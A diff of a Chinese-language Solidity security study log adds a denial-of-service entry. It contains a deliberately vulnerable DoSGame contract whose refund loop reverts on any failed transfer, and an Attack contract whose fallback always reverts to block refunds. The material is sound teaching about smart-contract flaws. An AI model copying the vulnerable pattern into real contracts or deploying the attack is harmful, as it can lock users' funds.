@@ -2997,8 +2997,51 @@ import '@openzeppelin/contracts/access/Ownable.sol';
     }
     ```
     - 解决办法：使用 (tx.origin == msg.sender) 来检测调用者是否为合约。如果调用者为 EOA，那么tx.origin和msg.sender相等；如果它们俩不相等，调用者为合约。
-- [104-S09] 拒绝服务
+- [104-S09] 拒绝服务（Denial of Service, DoS）
+    - 漏洞例子：游戏开始时，玩家们调用 deposit() 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，refund()函数被调用，将 ETH 依次退款给所有玩家。
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.21;
+    contract DoSGame {     // 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。
+        bool public refundFinished;
+        mapping(address => uint256) public balanceOf;
+        address[] public players;
 
+        function deposit() external payable {
+            require(!refundFinished, "Game Over");
+            require(msg.value > 0, "Please donate ETH");
+            balanceOf[msg.sender] = msg.value;
+            players.push(msg.sender);
+        }
+
+        function refund() external {
+            require(!refundFinished, "Game Over");
+            uint256 pLength = players.length;
+            for(uint256 i; i < pLength; i++){
+                address player = players[i];
+                uint256 refundETH = balanceOf[player];
+                (bool success, ) = player.call{value: refundETH}(""); // 如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行
+                require(success, "Refund Fail!");
+                balanceOf[player] = 0;
+            }
+            refundFinished = true;
+        }
+
+        function balance() external view returns(uint256){
+            return address(this).balance;
+        }
+    }
+
+    contract Attack {
+        fallback() external payable{
+            revert("DoS Attack!");
+        }
+        function attack(address gameAddr) external payable {
+            DoSGame dos = DoSGame(gameAddr);
+            dos.deposit{value: msg.value}();
+        }
+    }
+    ```
 
 <!-- Content_END -->
 ### 2024.10.15
